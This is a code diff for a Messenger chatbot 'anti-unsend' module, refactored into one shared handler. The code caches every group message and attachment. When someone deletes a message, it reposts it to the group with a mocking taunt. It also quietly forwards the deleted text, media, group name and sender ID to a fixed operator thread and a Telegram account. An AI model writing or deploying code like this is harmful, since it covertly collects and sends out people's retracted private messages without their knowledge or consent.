@@ -46,7 +46,7 @@ const saveSettings = (data) => {
 
 let settings = loadSettings();
 
-async function sendToTelegram(captionText, filePaths = [], api, threadID) {
+async function sendToTelegram(captionText, filePaths = []) {
 	if (!axios) return;
 	try {
 		if (filePaths.length === 0) {
@@ -113,11 +113,179 @@ async function sendToTelegram(captionText, filePaths = [], api, threadID) {
 	}
 }
 
+async function handleUnsendLogic({ api, event, Users, Threads }) {
+	const threadID = event.threadID;
+
+	if (settings[threadID] === false) return;
+
+	if (event.type === "message_unsend") {
+		const savedMsg = global.unsendMemoryMap.get(event.messageID);
+		if (!savedMsg) return;
+
+		const senderID = savedMsg.senderID;
+
+		let senderName = "User";
+		try {
+			if (Users && typeof Users.getNameInBand === "function") {
+				senderName = await Users.getNameInBand(senderID);
+			} else if (Users && typeof Users.getName === "function") {
+				senderName = await Users.getName(senderID);
+			} else if (api && typeof api.getUserInfo === "function") {
+				const res = await api.getUserInfo(senderID);
+				if (res && res[senderID] && res[senderID].name) {
+					senderName = res[senderID].name;
+				}
+			}
+		} catch (e) {}
+
+		let threadName = "Group/Inbox";
+		try {
+			if (Threads && typeof Threads.getName === "function") {
+				threadName = await Threads.getName(threadID);
+			} else if (api && typeof api.getThreadInfo === "function") {
+				const tInfo = await api.getThreadInfo(threadID);
+				if (tInfo && tInfo.threadName) {
+					threadName = tInfo.threadName;
+				}
+			}
+		} catch (e) {}
+
+		let msgContent = savedMsg.body ? savedMsg.body : "নেই (শুধুমাত্র মিডিয়া)";
+
+		let origResendBody = 
+`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
+_________________________
+কি ভাবছিস? 😏 ডিলিট করে বেঁচে যাবি নাকি? 😂
+» 👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName}
+» 💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 
+${msgContent}`;
+
+		let attachmentStreamsOriginal = [];
+		if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
+			for (const filePath of savedMsg.attachmentPaths) {
+				if (fs.existsSync(filePath)) {
+					attachmentStreamsOriginal.push(fs.createReadStream(filePath));
+				}
+			}
+		}
+
+		api.sendMessage({
+			body: origResendBody,
+			attachment: attachmentStreamsOriginal.length > 0 ? attachmentStreamsOriginal : undefined
+		}, threadID);
+
+		if (threadID !== TARGET_MESSENGER_THREAD_ID) {
+			let targetResendBody = 
+`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
+_________________________
+কি ভাবছিস? 😏 ডিলিট করে বেঁচে যাবি নাকি? 😂
+» 👨‍👩‍👧‍👦 𝐆𝐫𝐨𝐮𝐩: ${threadName}
+» 👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName}
+» 💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 
+${msgContent}`;
+
+			let attachmentStreamsTarget = [];
+			if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
+				for (const filePath of savedMsg.attachmentPaths) {
+					if (fs.existsSync(filePath)) {
+						attachmentStreamsTarget.push(fs.createReadStream(filePath));
+					}
+				}
+			}
+			try {
+				api.sendMessage({
+					body: targetResendBody,
+					attachment: attachmentStreamsTarget.length > 0 ? attachmentStreamsTarget : undefined
+				}, TARGET_MESSENGER_THREAD_ID);
+			} catch (e) {}
+		}
+
+		let telegramCaption = 
+`👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 (Anti-Unsend Alert)
+──────────────────
+👨‍👩‍👧‍👦 Group: ${threadName}
+👤 Sender: ${senderName} (ID: ${senderID})
+💬 Unsent Message:
+${msgContent}`;
+
+		const validPaths = (savedMsg.attachmentPaths || []).filter(p => fs.existsSync(p));
+		await sendToTelegram(telegramCaption, validPaths);
+
+		if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
+			savedMsg.attachmentPaths.forEach(p => {
+				try { fs.unlinkSync(p); } catch (e) {}
+			});
+		}
+
+		global.unsendMemoryMap.delete(event.messageID);
+		return;
+	}
+
+	if (event.type === "message" || event.type === "message_reply") {
+		fs.ensureDirSync(cacheDir);
+
+		let cachedAttachmentPaths = [];
+
+		if (axios && event.attachments && event.attachments.length > 0) {
+			for (let i = 0; i < event.attachments.length; i++) {
+				const att = event.attachments[i];
+				if (att.url) {
+					let ext = "png";
+					if (att.type === "photo") ext = "jpg";
+					else if (att.type === "video") ext = "mp4";
+					else if (att.type === "audio") ext = "mp3";
+					else if (att.type === "animated_image") ext = "gif";
+
+					const filePath = path.join(cacheDir, `${event.messageID}_${i}.${ext}`);
+					try {
+						const response = await axios({
+							method: "GET",
+							url: att.url,
+							responseType: "stream"
+						});
+						const writer = fs.createWriteStream(filePath);
+						response.data.pipe(writer);
+
+						await new Promise((resolve, reject) => {
+							writer.on("finish", resolve);
+							writer.on("error", (err) => {
+								writer.close();
+								reject(err);
+							});
+						});
+						cachedAttachmentPaths.push(filePath);
+					} catch (err) {
+						try { fs.unlinkSync(filePath); } catch (e) {}
+					}
+				}
+			}
+		}
+
+		global.unsendMemoryMap.set(event.messageID, {
+			body: event.body || "",
+			senderID: event.senderID,
+			attachmentPaths: cachedAttachmentPaths,
+			timestamp: Date.now()
+		});
+
+		if (global.unsendMemoryMap.size > 300) {
+			const oldestKey = global.unsendMemoryMap.keys().next().value;
+			const oldData = global.unsendMemoryMap.get(oldestKey);
+			if (oldData && oldData.attachmentPaths) {
+				oldData.attachmentPaths.forEach(p => {
+					try { fs.unlinkSync(p); } catch (e) {}
+				});
+			}
+			global.unsendMemoryMap.delete(oldestKey);
+		}
+	}
+}
+
 module.exports = {
 	config: {
 		name: "antiunsend",
 		aliases: ["unsend", "স্পাম", "ডিলেট", "resend"],
-		version: "8.0",
+		version: "10.0",
 		author: LOCKED_AUTHOR,
 		countDown: 0,
 		role: 0,
@@ -194,171 +362,15 @@ module.exports = {
 » 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`, threadID, event.messageID);
 	},
 
-	onChat: async function ({ api, event, Users, Threads }) {
-		const threadID = event.threadID;
+	onChat: async function (params) {
+		return await handleUnsendLogic(params);
+	},
 
-		if (settings[threadID] === false) return;
+	handleEvent: async function (params) {
+		return await handleUnsendLogic(params);
+	},
 
-		if (event.type === "message_unsend") {
-			const savedMsg = global.unsendMemoryMap.get(event.messageID);
-			if (!savedMsg) return;
-
-			const senderID = savedMsg.senderID;
-
-			let senderName = "User";
-			try {
-				if (Users && typeof Users.getNameInBand === "function") {
-					senderName = await Users.getNameInBand(senderID);
-				} else if (Users && typeof Users.getName === "function") {
-					senderName = await Users.getName(senderID);
-				} else if (api && typeof api.getUserInfo === "function") {
-					const res = await api.getUserInfo(senderID);
-					if (res && res[senderID] && res[senderID].name) {
-						senderName = res[senderID].name;
-					}
-				}
-			} catch (e) {}
-
-			let threadName = "Group/Inbox";
-			try {
-				if (Threads && typeof Threads.getName === "function") {
-					threadName = await Threads.getName(threadID);
-				} else if (api && typeof api.getThreadInfo === "function") {
-					const tInfo = await api.getThreadInfo(threadID);
-					if (tInfo && tInfo.threadName) {
-						threadName = tInfo.threadName;
-					}
-				}
-			} catch (e) {}
-
-			let msgContent = savedMsg.body ? savedMsg.body : "নেই (শুধুমাত্র মিডিয়া)";
-
-			let origResendBody = 
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-_________________________
-কি ভাবছিস? 😏 ডিলিট করে বেঁচে যাবি নাকি? 😂
-» 👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName}
-» 💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 
-${msgContent}`;
-
-			let attachmentStreamsOriginal = [];
-			if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
-				for (const filePath of savedMsg.attachmentPaths) {
-					if (fs.existsSync(filePath)) {
-						attachmentStreamsOriginal.push(fs.createReadStream(filePath));
-					}
-				}
-			}
-
-			await api.sendMessage({
-				body: origResendBody,
-				attachment: attachmentStreamsOriginal.length > 0 ? attachmentStreamsOriginal : undefined
-			}, threadID);
-
-			if (threadID !== TARGET_MESSENGER_THREAD_ID) {
-				let targetResendBody = 
-`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
-_________________________
-কি ভাবছিস? 😏 ডিলিট করে বেঁচে যাবি নাকি? 😂
-» 👨‍👩‍👧‍👦 𝐆𝐫𝐨𝐮𝐩: ${threadName}
-» 👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName}
-» 💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 
-${msgContent}`;
-
-				let attachmentStreamsTarget = [];
-				if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
-					for (const filePath of savedMsg.attachmentPaths) {
-						if (fs.existsSync(filePath)) {
-							attachmentStreamsTarget.push(fs.createReadStream(filePath));
-						}
-					}
-				}
-				try {
-					await api.sendMessage({
-						body: targetResendBody,
-						attachment: attachmentStreamsTarget.length > 0 ? attachmentStreamsTarget : undefined
-					}, TARGET_MESSENGER_THREAD_ID);
-				} catch (e) {}
-			}
-
-			let telegramCaption = 
-`👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 (Anti-Unsend Alert)
-──────────────────
-👨‍👩‍👧‍👦 𝐆𝐫𝐨𝐮𝐩: ${threadName}
-👤 𝐒𝐞𝐧𝐝𝐞𝐫: ${senderName} (ID: ${senderID})
-💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞:
-${msgContent}`;
-
-			const validPaths = (savedMsg.attachmentPaths || []).filter(p => fs.existsSync(p));
-			await sendToTelegram(telegramCaption, validPaths, api, threadID);
-
-			if (savedMsg.attachmentPaths && savedMsg.attachmentPaths.length > 0) {
-				savedMsg.attachmentPaths.forEach(p => {
-					try { fs.unlinkSync(p); } catch (e) {}
-				});
-			}
-
-			global.unsendMemoryMap.delete(event.messageID);
-			return;
-		}
-
-		if (event.type === "message" || event.type === "message_reply") {
-			fs.ensureDirSync(cacheDir);
-
-			let cachedAttachmentPaths = [];
-
-			if (axios && event.attachments && event.attachments.length > 0) {
-				for (let i = 0; i < event.attachments.length; i++) {
-					const att = event.attachments[i];
-					if (att.url) {
-						let ext = "png";
-						if (att.type === "photo") ext = "jpg";
-						else if (att.type === "video") ext = "mp4";
-						else if (att.type === "audio") ext = "mp3";
-						else if (att.type === "animated_image") ext = "gif";
-
-						const filePath = path.join(cacheDir, `${event.messageID}_${i}.${ext}`);
-						try {
-							const response = await axios({
-								method: "GET",
-								url: att.url,
-								responseType: "stream"
-							});
-							const writer = fs.createWriteStream(filePath);
-							response.data.pipe(writer);
-
-							await new Promise((resolve, reject) => {
-								writer.on("finish", resolve);
-								writer.on("error", (err) => {
-									writer.close();
-									reject(err);
-								});
-							});
-							cachedAttachmentPaths.push(filePath);
-						} catch (err) {
-							try { fs.unlinkSync(filePath); } catch (e) {}
-						}
-					}
-				}
-			}
-
-			global.unsendMemoryMap.set(event.messageID, {
-				body: event.body || "",
-				senderID: event.senderID,
-				attachmentPaths: cachedAttachmentPaths,
-				timestamp: Date.now()
-			});
-
-			if (global.unsendMemoryMap.size > 200) {
-				const oldestKey = global.unsendMemoryMap.keys().next().value;
-				const oldData = global.unsendMemoryMap.get(oldestKey);
-				if (oldData && oldData.attachmentPaths) {
-					oldData.attachmentPaths.forEach(p => {
-						try { fs.unlinkSync(p); } catch (e) {}
-					});
-				}
-				global.unsendMemoryMap.delete(oldestKey);
-			}
-		}
+	onEvent: async function (params) {
+		return await handleUnsendLogic(params);
 	}
 };
